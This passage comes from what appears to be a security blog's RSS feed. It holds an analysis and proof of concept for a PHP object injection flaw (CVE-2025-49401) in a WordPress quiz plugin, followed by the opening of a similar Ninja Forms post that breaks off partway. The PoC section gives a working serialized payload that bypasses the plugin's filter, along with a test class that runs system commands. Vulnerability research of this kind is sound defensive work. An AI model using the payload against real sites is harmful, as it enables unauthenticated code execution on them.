target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#39; alt=&#34;Diff&#34; height=&#34;772&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;After reviewing the logic of &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;, I noticed repeated appearances of keywords like &lt;code&gt;question&lt;/code&gt; and &lt;code&gt;answer&lt;/code&gt;, indicating this function is likely directly tied to question/answer processing.&lt;/p&gt;&#xA;&lt;p&gt;Instead of tracing step-by-step, I decided to search for related functions dealing with &lt;code&gt;question&lt;/code&gt; and &lt;code&gt;answer&lt;/code&gt;, while debugging inside &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;. If this method didn’t work, I would perform a deeper trace.&lt;/p&gt;&#xA;&lt;p&gt;After some digging, I created a post with a custom question.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; title=&#34;Creating quiz with the plugin block&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; data-sub-html=&#34;&lt;h2&gt;Quiz Created&lt;/h2&gt;&lt;p&gt;Creating quiz with the plugin block&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#39; alt=&#34;Quiz Created&#34; height=&#34;625&#34; width=&#34;978&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Creating quiz with the plugin block&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Access the post and &lt;strong&gt;submit an answer&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#34; title=&#34;Debugger at qsm_questions_answers_shortcode_to_text&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger at qsm_questions_answers_shortcode_to_text&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;428&#34; width=&#34;1189&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger at qsm_questions_answers_shortcode_to_text&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The debugger stopped at &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Current request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;qmn_sanitize_random_ids_data()&lt;/code&gt; will call &lt;code&gt;maybe_unserialize()&lt;/code&gt;. But first, this condition must be met:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can edit one of the fields in the request and replace it with &lt;code&gt;quiz_answer_random_ids&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- Content-Disposition: form-data; name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;- Asia/Bangkok&#xA;&amp;#43; Content-Disposition: form-data; name=&amp;#34;quiz_answer_random_ids&amp;#34;&#xA;&amp;#43; payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value of &lt;code&gt;qmn_sanitize_random_ids&lt;/code&gt; will be the input passed to &lt;code&gt;maybe_unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;![Debug](Value of qmn_sanitize_random_ids)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) {&#xA;&#x9;if ( is_string( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;return &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;$unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;&#x9;&#x9;&#x9;if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;return $unserialized;&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $qmn_sanitize_random_ids;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Before &lt;code&gt;maybe_unserialize&lt;/code&gt; is invoked, we need to bypass the only filter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The regex checks whether the string begins with &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt;. For example: &lt;code&gt;O:8:&amp;quot;stdClass&amp;quot;:...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Unfortunately, the defense is weak. Serialized payloads can begin with &lt;code&gt;a:&lt;/code&gt; (array), and arrays may contain &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt; to trigger object deserialization.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registers an AJAX endpoint for &lt;strong&gt;unauthenticated users&lt;/strong&gt; (nopriv):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_qmn_process_quiz&amp;#39;, array( $this, &amp;#39;ajax_submit_results&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a request hits &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=qmn_process_quiz&lt;/code&gt;, the callback &lt;code&gt;ajax_submit_results()&lt;/code&gt; is executed.&lt;/p&gt;&#xA;&lt;p&gt;It then calls &lt;code&gt;submit_results()&lt;/code&gt;, JSON-encodes the output, and echoes it.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo wp_json_encode( $this-&amp;gt;submit_results( $options, $data ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;submit_results()&lt;/code&gt; calls &lt;code&gt;display_results_text()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$results_pages   = $this-&amp;gt;display_results_text( $qmn_quiz_options, $qmn_array_for_variables );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;display_results_text()&lt;/code&gt; calls &lt;code&gt;generate_pages()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return QSM_Results_Pages::generate_pages( $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_pages()&lt;/code&gt; applies the filter previously registered: &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo apply_filters( &amp;#39;mlw_qmn_template_variable_results_page&amp;#39;, $page, $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#34; title=&#34;Many callbacks registered&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/callback.png&#34; data-sub-html=&#34;&lt;h2&gt;Callback&lt;/h2&gt;&lt;p&gt;Many callbacks registered&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#39; alt=&#34;Callback&#34; height=&#34;786&#34; width=&#34;1398&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Many callbacks registered&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Many callbacks are registered for this filter, but the relevant one here is &lt;code&gt;mlw_qmn_variable_question_answers&lt;/code&gt;, which directly triggers the function &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt; analyzed earlier.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=qmn_process_quiz&amp;amp;other_post_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_qmn_process_quiz&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;ajax_submit_results()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;submit_results()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;display_results_text()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_pages()&amp;#34;]&#xA;F -- apply filter mlw_qmn_template_variable_results_page --&amp;gt; G[&amp;#34;mlw_qmn_variable_question_answers()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;qsm_questions_answers_shortcode_to_text()&amp;#34;]&#xA;H --&amp;gt; K{&amp;#34; ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] )&amp;#34;}&#xA;K -- true --&amp;gt; L[&amp;#34;qmn_sanitize_random_ids_data()&amp;#34;] --&amp;gt; M{&amp;#34;preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids )&amp;#34;}&#xA;M -- true --&amp;gt; N[&amp;#34;return &amp;#39;&amp;#39;&amp;#34;]&#xA;M -- false --&amp;gt; V[&amp;#34;maybe_unserialize&amp;#34;] --&amp;gt; W[&amp;#34;RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use the plugin to create a post with a quiz using the QSM block.&lt;/li&gt;&#xA;&lt;li&gt;Submit the form and intercept the request via Burp.&lt;/li&gt;&#xA;&lt;li&gt;Modify the value of &lt;code&gt;quiz_answer_random_ids&lt;/code&gt; to contain the serialized payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;a:1:{i:0;O:15:&amp;#34;ObjectInjection&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Resend the request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To test locally, create a class with a magic method &lt;code&gt;__wakeup()&lt;/code&gt; or &lt;code&gt;__destruct()&lt;/code&gt; in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;    die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-49401&lt;/strong&gt; vulnerability is caused by unsafe input handling through &lt;code&gt;maybe_unserialize()&lt;/code&gt;, allowing unauthenticated attackers to provide serialized payloads to trigger PHP Object Injection. The filtering based on &lt;code&gt;preg_match&lt;/code&gt; only blocks payloads beginning with &lt;code&gt;O:&lt;/code&gt; or &lt;code&gt;C:&lt;/code&gt; but fails against serialized arrays containing objects. Combined with an open AJAX endpoint (&lt;code&gt;wp_ajax_nopriv_qmn_process_quiz&lt;/code&gt;), the payload moves through several layers before being unserialized, ultimately enabling arbitrary code execution (RCE) if a suitable gadget chain exists.&#xA;The patch uses &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt;, completely eliminating object creation and fully mitigating the vulnerability.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;maybe_unserialize() is inherently dangerous&lt;/strong&gt; when handling user input in WordPress.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Manual regex filtering is insufficient&lt;/strong&gt; to stop deserialization attacks — attackers can wrap malicious objects inside arrays.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Unauthenticated AJAX endpoints&lt;/strong&gt; are highly sensitive attack surfaces.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;allowed_classes = false&lt;/strong&gt; is the safest mitigation when object deserialization is not needed.&lt;/li&gt;&#xA;&lt;li&gt;The more complex the plugin, the &lt;strong&gt;higher the chance of gadget chains leading to RCE&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/quiz-master-next/vulnerability/wordpress-quiz-and-survey-master-plugin-10-2-5-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin &amp;lt;= 10.2.5 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9083 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-14-cve-2025-9083/</link>
      <pubDate>Fri, 14 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-14-cve-2025-9083/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin performs an &lt;strong&gt;unserialize&lt;/strong&gt; operation on data submitted by users through form fields. This allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to perform &lt;strong&gt;PHP Object Injection&lt;/strong&gt; if a suitable gadget exists within the system.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9083&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9083&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a 